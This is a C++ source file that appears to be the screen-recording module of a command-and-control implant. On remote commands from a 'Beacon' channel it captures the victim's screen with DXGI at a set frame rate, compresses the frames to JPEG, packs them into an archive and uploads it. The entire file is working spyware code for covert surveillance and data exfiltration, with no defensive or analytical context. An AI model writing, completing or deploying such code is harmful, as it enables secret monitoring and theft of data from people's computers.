#include "screen_recorder.h"
#include "../config.h"
#include "../dxgi_capture.h"
#include <windows.h>
#include <gdiplus.h>
#include <cstdlib>
#include <vector>
#pragma comment(lib, "gdiplus.lib")

namespace ScreenRecorder {
    bool recording = false;
    HANDLE hThread = NULL;
    int durationSec = 60;
    int fps = 10;
    int quality = 80;
    ULONG_PTR gdiToken = 0;

    static int GetJpegEncoderClsid(CLSID* clsid) {
        UINT num = 0, size = 0;
        Gdiplus::GetImageEncodersSize(&num, &size);
        if (size == 0) return -1;
        auto codecs = (Gdiplus::ImageCodecInfo*)malloc(size);
        Gdiplus::GetImageEncoders(num, size, codecs);
        for (UINT i = 0; i < num; i++) {
            if (wcscmp(codecs[i].MimeType, L"image/jpeg") == 0) {
                *clsid = codecs[i].Clsid;
                free(codecs);
                return 0;
            }
        }
        free(codecs);
        return -1;
    }

    static std::vector<BYTE> BgraToJpeg(const BYTE* bgra, int w, int h, int q) {
        Gdiplus::Bitmap bmp(w, h, w * 4, PixelFormat32bppRGB, (BYTE*)bgra);
        CLSID clsid;
        GetJpegEncoderClsid(&clsid);
        Gdiplus::EncoderParameters params;
        params.Count = 1;
        params.Parameter[0].Guid = Gdiplus::EncoderQuality;
        params.Parameter[0].Type = Gdiplus::EncoderParameterValueTypeLong;
        params.Parameter[0].NumberOfValues = 1;
        ULONG ql = q;
        params.Parameter[0].Value = &ql;

        IStream* stream = nullptr;
        CreateStreamOnHGlobal(nullptr, TRUE, &stream);
        bmp.Save(stream, &clsid, &params);

        STATSTG stat;
        stream->Stat(&stat, STATFLAG_NONAME);
        LARGE_INTEGER zero = {};
        stream->Seek(zero, STREAM_SEEK_SET, nullptr);

        std::vector<BYTE> data(stat.cbSize.LowPart);
        ULONG read = 0;
        stream->Read(data.data(), (ULONG)data.size(), &read);
        stream->Release();
        return data;
    }

    DWORD WINAPI RecordThread(LPVOID param) {
        DXGICapture capture;
        if (!capture.Init()) {
            recording = false;
            return 1;
        }

        if (!gdiToken) {
            Gdiplus::GdiplusStartupInput input;
            Gdiplus::GdiplusStartup(&gdiToken, &input, nullptr);
        }

        int totalFrames = durationSec * fps;
        int intervalMs = 1000 / fps;

        std::vector<std::vector<BYTE>> frames;
        frames.reserve(totalFrames);

        for (int i = 0; i < totalFrames && recording; i++) {
            std::vector<BYTE> bgra;
            int w = 0, h = 0;
            if (capture.CaptureFrame(bgra, w, h)) {
                auto jpeg = BgraToJpeg(bgra.data(), w, h, quality);
                if (!jpeg.empty()) {
                    frames.push_back(std::move(jpeg));
                }
            }
            Sleep(intervalMs);
        }

        capture.Release();

        // Pack: [4-byte count] [4-byte size] [data] ...
        std::vector<BYTE> archive;
        DWORD count = (DWORD)frames.size();
        archive.insert(archive.end(), (BYTE*)&count, (BYTE*)&count + 4);
        for (auto& frame : frames) {
            DWORD sz = (DWORD)frame.size();
            archive.insert(archive.end(), (BYTE*)&sz, (BYTE*)&sz + 4);
            archive.insert(archive.end(), frame.begin(), frame.end());
        }

        if (!archive.empty()) {
            Beacon::UploadFile("screen_rec", "screen_rec.bin", archive);
        }

        recording = false;
        return 0;
    }

    void Start(const std::string& params) {
        if (recording) return;
        durationSec = 60;
        fps = SCREEN_FPS;
        quality = SCREEN_QUALITY;

        if (!gdiToken) {
            Gdiplus::GdiplusStartupInput input;
            Gdiplus::GdiplusStartup(&gdiToken, &input, nullptr);
        }

        recording = true;
        hThread = CreateThread(nullptr, 0, RecordThread, nullptr, 0, nullptr);
    }

    void Stop() {
        recording = false;
        if (hThread) {
            WaitForSingleObject(hThread, 5000);
            CloseHandle(hThread);
            hThread = nullptr;
        }
    }

    void OnCommand(const Beacon::Command& cmd) {
        if (cmd.type == "screen_rec_start") Start(cmd.params);
        else if (cmd.type == "screen_rec_stop") Stop();
    }

    bool IsRecording() { return recording; }
}
